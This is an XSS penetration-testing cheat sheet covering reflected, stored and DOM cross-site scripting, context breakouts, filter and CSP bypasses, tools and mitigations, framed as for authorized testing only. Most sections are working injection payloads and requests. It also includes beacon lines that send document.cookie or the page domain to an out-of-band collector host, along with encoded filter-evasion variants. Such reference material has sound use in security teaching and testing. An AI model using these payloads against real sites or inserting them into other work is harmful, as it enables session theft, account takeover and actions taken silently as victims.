## ⚡ XSS (Cross-Site Scripting) Cheat Sheet

> **Scope:** Authorized testing only. Use systems you own or have explicit written permission to assess. All values are synthetic (`<TARGET>`, `<PARAM>`, `<USER>`, `<OOB-HOST>`); never store captured flags, tokens, or real credentials.
---
### 🧭 **1. Quick Reference**

| Family | Where it lands | Trigger | Key detail |
|--------|----------------|---------|------------|
| **Reflected** | Request echoed in response | Crafted link | One-shot, not stored |
| **Stored** | DB, file, log, or profile | Any page view | Affects many users |
| **DOM** | Client JS source → sink | Fragment/query | Server response looks clean |

Harmless execution marker: `alert(1)` / `console.log(1)`. Escalate only to reading a synthetic value (`document.cookie`, `localStorage.getItem('<KEY>')`) into `<OOB-HOST>`.

### 🔍 **2. Map the Context**

| Context | Probe | Why it matters |
|---------|-------|----------------|
| HTML text | `<b>PROBE_123</b>` | Tags interpreted directly |
| Quoted attribute | `value="PROBE_123"` | Must break the quote |
| Unquoted attribute | `value=PROBE_123` | Space/slash starts an attribute |
| Script body | `var x='PROBE_123';` | JS grammar applies |
| JS string/template | quote or backtick break | Need JS comment terminator |
| URL | `href="PROBE_123"` | `javascript:` may be allowed |
| CSS / JSON | `style="color:PROBE_123"` / `{"q":"PROBE_123"}` | Engine-dependent / client decodes |

```http
GET http://<TARGET>/search?q=PROBE_123 HTTP/1.1
Host: <TARGET>
```
Search the response for the probe and note surrounding characters and transformations (entity encoding, case folding, truncation).

### 💥 **3. Reflected XSS**

```text
http://<TARGET>/search?q=<script>alert(1)</script>
http://<TARGET>/search?q=<img src=x onerror=alert(1)>
http://<TARGET>/search?q=<svg onload=alert(1)>
http://<TARGET>/search?q="><svg onload=alert(1)>
http://<TARGET>/search?q=' onmouseover='alert(1)
http://<TARGET>/search?q=<details open ontoggle=alert(1)>
```
Also check error pages, redirects, exports, and debug headers for reflection.

### 📦 **4. Stored XSS**

```http
POST http://<TARGET>/profile HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

display_name=<USER>&bio=<img src=x onerror=alert(document.domain)>
```
Submit once, then revisit the profile, admin queue, notification, log viewer, or export. Test filenames, user agents, referrers, chat, and support tickets. For blind cases use a beacon:

```javascript
fetch('https://<OOB-HOST>/xss?d=' + encodeURIComponent(document.domain));
```

### 🧩 **5. DOM XSS**

| Source (attacker-controlled) | Sink (dangerous) |
|------------------------------|------------------|
| `location.hash`, `location.search` | `innerHTML`, `document.write` |
| `document.referrer`, `window.name` | `eval`, `setTimeout(string)` |
| `postMessage` data | `jQuery.html()`, `append()` |
| Any of the above | `location =` (open redirect → JS URL) |

```text
http://<TARGET>/page#<img src=x onerror=alert(1)>
http://<TARGET>/page?<PARAM>="><svg onload=alert(1)>
```

```javascript
document.getElementById('out').innerHTML = location.hash.slice(1); // vulnerable
document.getElementById('out').textContent = location.hash.slice(1); // safe
```
Trace minified bundles backwards from sinks with DevTools.

### 🪄 **6. Context Breakouts**

| Context | Payload pattern |
|---------|-----------------|
| Quoted attribute | `" onmouseover="alert(1)` |
| Single-quoted attribute | `' onfocus='alert(1)` + `autofocus` |
| Unquoted attribute | `x onmouseover=alert(1)` |
| `<textarea>` / `<title>` | `</textarea><svg onload=alert(1)>` |
| JS single-quoted string | `';alert(1)//` |
| JS expression / template | `-alert(1)//` |
| URL attribute | `javascript:alert(1)` / `data:text/javascript,alert(1)` |

### 🛡️ **7. Filter and CSP Bypasses**

| Blocked | Idea |
|---------|------|
| `<script>` | `<svg onload>`, `<img onerror>`, `<details ontoggle>` |
| `alert(` | `print()`, `prompt()`, `console.log()` |
| spaces / quotes | `/` or `%0a`; backticks in JS, `&quot;` in HTML |
| keywords | Mixed case `<ScRiPt>` (HTML tags are case-insensitive) |
| `onerror` | `onload`, `ontoggle`, `onanimationstart`, `onfocusin` |
| `javascript` | Entity form `java&#x73;cript:` |
| CSP blocks inline | Allowlisted script/JSONP gadget, dangling markup |

```html
<svg/onload=alert(1)>
<img src=x/onerror=alert(1)>
<sCrIpT>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</script>
```
```text
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
```
Encoding helps only if a later layer decodes it as HTML/JS — verify against the real response.

### 🧪 **8. Impact Demonstration (Safe Data)**

```javascript
alert(document.domain);
alert(localStorage.getItem('<KEY>'));
new Image().src = 'https://<OOB-HOST>/x?c=' + encodeURIComponent(document.cookie);
```
`HttpOnly` cookies are unreadable by JS: demonstrate impact via in-session actions instead. Keep captured values out of notes and screenshots.

### 🛠️ **9. Tools**

| Tool | Use |
|------|-----|
| **Burp Suite** | Repeater context mapping; DOM Invader |
| **Browser DevTools** | Trace sources/sinks in bundles |
| **XSStrike / dalfox** | Context-aware payload generation and scanning |
| **OOB collector** | Blind/stored callback handling |

### 💥 **10. Impact**

Session/token theft and account takeover; silent actions as the victim; defacement, phishing, keylogging; admin-panel compromise via stored payloads.

### 🔐 **11. Mitigation**

- Apply **contextual output encoding** (HTML, attribute, JS, URL, CSS) at render time.
- Prefer `textContent` and framework autoescaping; sanitize required HTML with DOMPurify.
- Strict **CSP** with nonces/hashes, `object-src 'none'`, `base-uri 'none'`; avoid `unsafe-inline`.
- Cookies: `HttpOnly`, `Secure`, `SameSite`; adopt **Trusted Types** against DOM sinks.
- Validate URL schemes (`http`/`https` only); never `eval` user data.

### ✅ **12. Testing Checklist**

- [ ] Authorization/scope confirmed.
- [ ] Probe transformations/context recorded; reflected, stored, DOM tested.
- [ ] Event handlers, encoding, and CSP behavior verified.
- [ ] Blind proof uses `<OOB-HOST>` with synthetic data only.

### 📚 **13. References**

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [DOMPurify](https://github.com/cure53/DOMPurify) · [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)

**⚡ Happy Hacking!**
